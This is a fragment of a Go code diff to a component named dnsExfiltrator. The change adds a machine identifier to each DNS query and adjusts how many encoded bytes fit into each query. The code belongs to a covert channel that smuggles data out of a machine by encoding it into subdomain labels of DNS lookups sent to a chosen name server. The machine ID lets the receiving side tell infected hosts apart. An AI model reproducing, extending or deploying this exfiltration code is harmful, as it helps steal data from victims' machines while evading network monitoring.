@@ -22,15 +22,17 @@ const (
 
 type dnsExfiltrator struct {
 	nameServer string
+	machineId  string
 }
 
-func NewDnsExfiltrator(nameServer string) *dnsExfiltrator {
+func NewDnsExfiltrator(nameServer string, machineId string) *dnsExfiltrator {
 	absoluteNameServer := nameServer
 	if nameServer[len(nameServer)-1] != '.' {
 		absoluteNameServer += "."
 	}
 	return &dnsExfiltrator{
 		nameServer: absoluteNameServer,
+		machineId:  machineId,
 	}
 }
 
@@ -52,12 +54,13 @@ func (ex *dnsExfiltrator) exfiltrateData(msgType dnsMsgType, encodedData string)
 	//
 	// This means that we need to take into account the length byte at the very
 	// start as well as at the very end, hence subtract 2. We subtract another
-	// 2 for the DNS message type.
-	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.nameServer) - 2 - 2
+	// 2 for the DNS message type, and another 1 for the period after the
+	// machine ID.
+	numOfBytesPerQuery := MAX_DOMAIN_NAME_LENGTH - len(ex.nameServer) - 2 - 2 - len(ex.machineId) - 1
 
 	for len(encodedData) != 0 {
 		bytesLeft := numOfBytesPerQuery
-		dataToExfiltrate := msgType.String() + "."
+		dataToExfiltrate := msgType.String() + "." + ex.machineId + "."
 		for bytesLeft > 0 {
 			numBytesToAdd := bytesLeft
 			if numBytesToAdd > MAX_SUBDOMAIN_NAME_LENGTH {
